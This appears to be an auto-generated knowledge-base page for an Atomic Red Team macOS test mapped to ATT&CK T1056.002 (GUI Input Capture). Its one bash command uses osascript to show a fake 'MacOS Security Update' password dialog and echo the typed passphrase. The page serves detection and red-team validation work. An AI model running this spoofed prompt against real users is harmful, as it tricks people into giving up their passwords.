---
atomic_guid: "b7037b89-947a-427a-ba29-e7e9f09bc045"
title: "AppleScript - Spoofing a credential prompt using osascript"
framework: "atomic"
generated: "true"
attack_technique_id: "T1056.002"
attack_technique_name: "Input Capture: GUI Input Capture"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "bash"
aliases:
  - "b7037b89-947a-427a-ba29-e7e9f09bc045"
  - "AppleScript - Spoofing a credential prompt using osascript"
platforms:
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# AppleScript - Spoofing a credential prompt using osascript

Prompt user for password without requiring permissions to send Apple events to System Settings.
https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/

## Metadata

- Atomic GUID: b7037b89-947a-427a-ba29-e7e9f09bc045
- Technique: T1056.002: Input Capture: GUI Input Capture
- Platforms: macos
- Executor: bash
- Source Path: atomics/T1056.002/T1056.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1056-input_capture|T1056.002]]

## Executor

- name: bash

### Command

```bash
PWD_SPOOF=$(osascript -e 'display dialog "To perform a security update MacOS needs your passphrase." with title "MacOS Security Update" default answer "" with icon stop with hidden answer')
echo $PWD_SPOOF
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.yaml)
